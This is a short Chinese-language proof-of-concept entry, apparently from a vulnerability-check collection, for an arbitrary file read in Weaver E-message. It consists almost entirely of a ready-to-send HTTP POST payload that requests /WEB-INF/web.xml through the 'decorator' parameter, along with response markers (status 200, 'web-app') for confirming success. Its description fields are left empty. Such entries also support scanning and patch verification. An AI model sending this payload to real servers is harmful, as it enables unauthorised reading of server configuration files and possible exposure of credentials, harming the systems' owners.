﻿# 泛微 E-message 任意文件读取

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

decorator=%2FWEB-INF%2Fweb.xml&confirm=true
```

> 响应代码特征：200

> 响应内容特征：web-app

> 上传文件定位：

> 验证文件来源：泛微 E-message 任意文件读取.poc
